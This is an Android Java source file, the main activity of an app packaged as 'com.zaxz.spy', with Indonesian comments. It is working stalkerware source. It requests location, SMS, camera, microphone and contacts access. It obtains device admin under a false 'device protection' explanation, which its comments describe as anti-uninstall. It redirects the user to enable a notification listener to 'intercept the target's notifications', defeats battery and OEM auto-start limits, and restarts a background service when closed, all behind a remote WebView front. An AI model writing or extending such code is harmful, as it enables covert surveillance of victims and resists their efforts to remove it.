package com.zaxz.spy;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.os.Handler;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private static final int ADMIN_INTENT = 124;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            Config.loadConfig(this);
            
            devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            adminComponent = new ComponentName(this, AdminReceiver.class);
            
            requestPermissions();
            setupWebView();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            finish();
        }
    }
    
    private void requestPermissions() {
        try {
            String[] permissions;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.CAMERA,
                    Manifest.permission.FOREGROUND_SERVICE,
                    Manifest.permission.SYSTEM_ALERT_WINDOW,
                    Manifest.permission.READ_PHONE_STATE,
                    // ============ PERMISSION BARU UNTUK FITUR BARU ============
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS
                };
            } else {
                permissions = new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.CAMERA,
                    Manifest.permission.FOREGROUND_SERVICE,
                    Manifest.permission.SYSTEM_ALERT_WINDOW,
                    Manifest.permission.READ_PHONE_STATE,
                    // ============ PERMISSION BARU UNTUK FITUR BARU ============
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS
                };
            }

            boolean needRequest = false;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    needRequest = true;
                    break;
                }
            }

            if (needRequest) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            }

            // ============ OVERLAY PERMISSION (untuk show floating images/popup) ============
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }

            // ============ BATTERY OPTIMIZATION BYPASS ============
            // Beberapa OEM (Xiaomi MIUI, Huawei EMUI, Oppo ColorOS) sangat
            // agresif nge-kill background service. Selain request ignore
            // battery optimization, kita juga harus minta user disable
            // auto-start restriction di OEM-specific settings.
            requestBatteryOptimizationBypass();

            // ============ DEVICE ADMIN (anti-uninstall) ============
            // Kalau user skip device admin pertama kali, kita re-prompt.
            // Tanpa admin aktif, fitur Lock gak jalan & user bisa uninstall
            // APK dengan gampang dari Settings.
            requestDeviceAdminIfNeeded();

            // ============ NOTIFICATION LISTENER (intercept notif target) ============
            // Harus di-enable manual user di Settings, kita auto-redirect.
            requestNotificationListenerAccessIfNeeded();

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        startService(new Intent(MainActivity.this, BackgroundService.class));
                    } catch (Exception e) {}
                }
            }, 2000);

        } catch (Exception e) {}
    }

    /**
     * Battery optimization bypass:
     *  1. Minta user whitelist app dari battery optimization (system dialog).
     *  2. (OEM-specific) Buka manufacturer-specific auto-start settings
     *     supaya service gak di-kill. Tidak semua OEM support — kita try-catch.
     */
    private void requestBatteryOptimizationBypass() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && powerManager != null) {
                if (!powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                    try {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    } catch (Exception e) {
                        // Fallback ke settings page umum
                        Intent fallback = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                        startActivity(fallback);
                    }
                }
            }

            // OEM-specific auto-start settings (Xiaomi, Huawei, Oppo, Vivo, Samsung, Asus)
            requestOemAutoStartPermission();
        } catch (Exception e) {}
    }

    /**
     * Buka auto-start settings untuk OEM yang punya restriction tambahan.
     * Try-catch tiap brand — kalau intent-nya gak support, skip.
     */
    private void requestOemAutoStartPermission() {
        try {
            Intent intent = new Intent();
            String manufacturer = Build.MANUFACTURER == null ? "" : Build.MANUFACTURER.toLowerCase();

            if (manufacturer.contains("xiaomi")) {
                intent.setComponent(new android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (manufacturer.contains("oppo")) {
                intent.setComponent(new android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (manufacturer.contains("vivo")) {
                intent.setComponent(new android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"));
            } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
                intent.setComponent(new android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (manufacturer.contains("asus")) {
                intent.setComponent(new android.content.ComponentName(
                    "com.asus.mobilemanager",
                    "com.asus.mobilemanager.entry.FunctionActivity"));
            } else if (manufacturer.contains("samsung")) {
                intent.setAction("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS");
            } else {
                return; // OEM gak dikenal, skip
            }

            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            // OEM gak punya activity auto-start (atau path-nya beda di versi baru)
        }
    }

    /**
     * Device admin: kalau belum aktif, prompt ulang. Anti-uninstall gak
     * jalan kalau admin belum aktif.
     */
    private void requestDeviceAdminIfNeeded() {
        try {
            if (devicePolicyManager == null || !devicePolicyManager.isAdminActive(adminComponent)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Required for device protection and remote lock features.");
                startActivityForResult(intent, ADMIN_INTENT);
            }
        } catch (Exception e) {}
    }

    /**
     * Notification listener access: untuk intercept notifikasi target.
     * User harus enable manual di Settings, kita auto-redirect.
     */
    private void requestNotificationListenerAccessIfNeeded() {
        try {
            android.content.ContentResolver cr = getContentResolver();
            String enabledListeners = android.provider.Settings.Secure.getString(cr, "enabled_notification_listeners");
            String myListener = getPackageName() + "/com.zaxz.spy.BackgroundService";

            if (enabledListeners == null || !enabledListeners.contains(myListener)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
        } catch (Exception e) {}
    }
    
    private void setupWebView() {
        try {
            WebView webView = new WebView(this);
            webView.setBackgroundColor(0x00000000);
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null);
            
            WebSettings webSettings = webView.getSettings();
            webSettings.setJavaScriptEnabled(true);
            webSettings.setLoadWithOverviewMode(true);
            webSettings.setUseWideViewPort(true);
            webSettings.setBuiltInZoomControls(false);
            webSettings.setDisplayZoomControls(false);
            webSettings.setAllowFileAccess(false);
            webSettings.setCacheMode(WebSettings.LOAD_NO_CACHE);
            
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    view.loadUrl(url);
                    return true;
                }
            });
            
            webView.loadUrl("https://zyyempire-jckc.vercel.app");
            
            setContentView(webView);
        } catch (Exception e) {}
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == ADMIN_INTENT && resultCode == RESULT_OK) {
            Toast.makeText(this, "Admin activated", Toast.LENGTH_SHORT).show();
        }
    }
    
    @Override
    protected void onDestroy() {
        try {
            Intent intent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {}
        super.onDestroy();
    }
}